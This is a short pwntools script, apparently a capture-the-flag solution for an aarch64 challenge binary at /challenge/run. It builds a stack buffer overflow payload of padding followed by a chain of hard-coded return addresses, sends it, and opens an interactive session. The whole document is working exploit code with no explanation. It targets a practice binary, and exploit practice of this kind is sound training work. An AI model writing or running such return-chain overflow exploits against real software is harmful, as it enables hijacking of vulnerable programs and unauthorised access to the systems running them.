from pwn import *
context.arch="aarch64"
# exe_name = "/usr/bin/qemu-aarch64-static"
# eargv = ["/usr/bin/qemu-aarch64-static", "-g", "1234", "/challenge/level-3-0"]
# p = process(executable= exe_name, argv=eargv)
exe_name = "/challenge/run"
p = process(exe_name)
exp= b"A"*(0x8a+8) \
+ 0x40185C.to_bytes(8, "little") + b"A"*0x128 \
+ 0x40178C.to_bytes(8, "little") + b"A"*0x138 \
+ 0x4015E8.to_bytes(8, "little") + b"A"*0x138 \
+ 0x4016B8.to_bytes(8, "little") + b"A"*0x138 \
+ 0x401518.to_bytes(8, "little") + b"A"*0x138

p.send(exp)

p.interactive()

